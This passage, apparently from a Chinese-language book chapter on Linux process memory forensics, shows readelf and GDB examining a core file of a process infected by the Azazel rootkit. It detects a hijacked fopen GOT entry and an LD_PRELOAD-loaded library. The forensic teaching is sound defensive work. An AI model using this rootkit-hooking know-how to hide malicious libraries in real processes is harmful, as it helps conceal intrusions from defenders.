这是为了节省空间，因为 Linux 内核开发人员认为文本段不会在内存中被修改。因此，在访问文本区域时，只需引用原始可执行文件和共享库即可满足调试器的需求。如果核心文件要为每个共享库转储完整的文本段，那么对于诸如 Wireshark 或 Firefox 之类的大型程序，输出的核心转储文件将是巨大的。

因此，出于调试目的，通常可以假设文本段在内存中没有发生变化，并且只需引用可执行文件和共享库文件本身来获取文本。但是对于运行时恶意软件分析和进程内存取证呢？在许多情况下，文本段已被标记为可写，并包含用于代码变异的多态引擎，在这些情况下，核心文件可能无法用于查看代码段。

此外，如果核心文件是唯一可用于分析的工件，原始可执行文件和共享库已不再可访问呢？这进一步证明了为什么核心文件并不特别适合进程内存取证；也从未打算如此。

### 注意

在下一章中，我们将看到 ECFS 如何解决许多使核心文件成为取证目的无用工件的弱点。

### 使用 GDB 进行取证的核心文件

结合原始可执行文件，并假设没有对代码进行修改（对文本段），我们仍然可以在一定程度上使用核心文件进行恶意软件分析。在这种特殊情况下，我们正在查看 Azazel rootkit 的核心文件，正如我们在本章前面所演示的那样，它具有 PLT/GOT 钩子：

```
$ readelf -S host | grep got.plt
  [23] .got.plt          PROGBITS         0000000000601000  00001000
$ readelf -r host
Relocation section '.rela.plt' at offset 0x3f8 contains 6 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 unlink + 0
000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts + 0
000000601028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 opendir + 0
000000601030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main+0
000000601038  000500000007 R_X86_64_JUMP_SLO 0000000000000000 __gmon_start__ + 0
000000601040  000600000007 R_X86_64_JUMP_SLO 0000000000000000 fopen + 0

```

因此，让我们来看一下我们已经知道被 Azazel 劫持的函数。`fopen`函数是受感染程序中的四个共享库函数之一，正如我们从前面的输出中可以看到的，它在`0x601040`处有一个 GOT 条目：

```
$ gdb -q ./host core
Reading symbols from ./host...(no debugging symbols found)...done.
[New LWP 9875]
Core was generated by `./host'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x000000000040064f in main ()
(gdb) x/gx 0x601040
0x601040 <fopen@got.plt>:  0x00007ff1673a8609
(gdb)
```

如果我们再次查看`PT_NOTE`段中的`NT_FILE`条目（`readelf -n core`），我们可以看到`libc-2.19.so`文件在内存中映射到的地址范围，并检查`fopen`的 GOT 条目是否指向了`libc-2.19.so`，正如它应该的那样：

```
$ readelf -n core
<snippet>
 0x00007ff166fe0000  0x00007ff16719b000  0x0000000000000000
        /lib/x86_64-linux-gnu/libc-2.19.so
</snippet>
```

`fopen@got.plt`指向`0x7ff1673a8609`。这超出了之前显示的`libc-2.19.so`文本段范围，即`0x7ff166fe0000`到`0x7ff16719b000`。使用 GDB 检查核心文件与使用 GDB 检查实时进程非常相似，您可以使用下面显示的相同方法来定位环境变量并检查`LD_PRELOAD`是否已设置。

以下是在核心文件中定位环境变量的示例：

```
(gdb) x/4096s $rsp

… scroll down a few pages …

0x7fffb25388db:  "./host"
0x7fffb25388e2:  "LD_PRELOAD=./libselinux.so"
0x7fffb25388fd:  "SHELL=/bin/bash"
0x7fffb253890d:  "TERM=xterm"
0x7fffb2538918:  "OLDPWD=/home/ryan"
0x7fffb253892a:  "USER=root"
```

# 总结

进程内存取证的艺术是法证工作的一个非常特定的方面。它主要关注与进程图像相关的内存，这本身就相当复杂，因为它需要对 CPU 寄存器、堆栈、动态链接和 ELF 有复杂的了解。

因此，熟练地检查进程中的异常确实是一种通过经验不断积累的艺术和技能。本章作为该主题的入门指南，让初学者能够了解如何开始。在下一章中，我们将讨论进程取证，您将了解 ECFS 技术如何使其变得更加容易。

在完成本章和下一章之后，我建议您使用本章中引用的一些工具在您的系统上感染一些进程，并尝试检测它们的方法。
